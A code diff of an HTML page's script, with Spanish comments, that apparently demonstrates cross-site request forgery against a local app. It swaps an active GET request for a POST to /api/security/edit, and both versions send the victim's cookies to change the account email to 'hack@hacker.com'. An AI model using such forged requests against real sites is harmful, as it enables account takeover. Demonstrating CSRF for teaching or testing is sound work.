@@ -56,28 +56,28 @@
       </p>
     </div>
     <script>
-      // Esto es CSRF con post
-      // fetch("/api/security/edit", {
-      //   method: "POST",
-      //   credentials: "include",
-      //   headers: {
-      //     "Content-Type": "application/json",
-      //   },
-      //   body: JSON.stringify({
-      //     email: "hack@hacker.com",
-      //   }),
-      // });
-      // Esto es CSRF con get
-      fetch("http://localhost:3000/api/security/edit?" +
-        new URLSearchParams({
-                    email: "hack@hacker.com",
-        }), {
-        method: "GET",
+      // Esto es CSRF mediante una petición POST
+      fetch("/api/security/edit", {
+        method: "POST",
         credentials: "include",
-      })
-        .then((response) => response.text())
-        .then((text) => console.log(text))
-        .catch((error) => console.log(error));
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          email: "hack@hacker.com",
+        }),
+      });
+      // Esto es CSRF mediante una petición GET
+      // fetch("http://localhost:3000/api/security/edit?" +
+      //   new URLSearchParams({
+      //     email: "hack@hacker.com",
+      //   }), {
+      //   method: "GET",
+      //   credentials: "include",
+      // })
+      //   .then((response) => response.json())
+      //   .then((text) => console.log(text))
+      //   .catch((error) => console.log(error));
     </script>
   </body>
 </html>
